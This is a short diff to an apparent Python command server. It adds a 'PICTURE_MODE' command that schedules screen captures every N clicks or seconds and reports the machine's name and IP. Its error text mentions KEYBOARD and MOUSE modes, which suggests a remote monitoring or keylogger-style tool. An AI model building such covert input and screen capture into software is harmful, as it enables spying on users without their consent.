@@ -152,7 +152,20 @@ class Server_subprocess:
                                 elif index == 19: #MOVE ##################### SETUP RETURN > give path
                                     result = "PONG ! From {} IP : {}.".format(self.name,self.ip)
                                     print(printable)
-                                
+                                elif index == 20:
+                                    result = "Incomplete or invalid command e.g : PICTURE_MODE [TIMER/CLICK] 10(secondes / clicks RECOMMANDED 50)"
+                                    if not data_array[1].upper() in ["TIMER","CLICK"]:raise Exception("Error, the first argument must be KEYBOARD, MOUSE or PICTURE")#Check argument if is integer
+                                    elif not int(data_array[2]):raise Exception("Error, the second argument must be an integer")#Check argument if is integer
+                                    else:
+                                        printable["mode"] = data_array[1].upper()
+                                        printable["number"] = data_array[2]
+
+                                        if printable["mode"] == "CLICK":
+                                            result = "Task '{}' found, description : {}. For {} IP : {}. Timer is setup on mode {} - every {} click.".format(task,printable["description"],self.name,self.ip,data_array[1],data_array[2])
+                                        elif printable["mode"] == "TIMER":
+                                            result = "Task '{}' found, description : {}. For {} IP : {}. Timer is setup on mode {} - {} every secondes.".format(task,printable["description"],self.name,self.ip,data_array[1],data_array[2])
+                                        
+                                        print(printable)
                         except Exception:
                             print("{'error':404}")
                         finally:
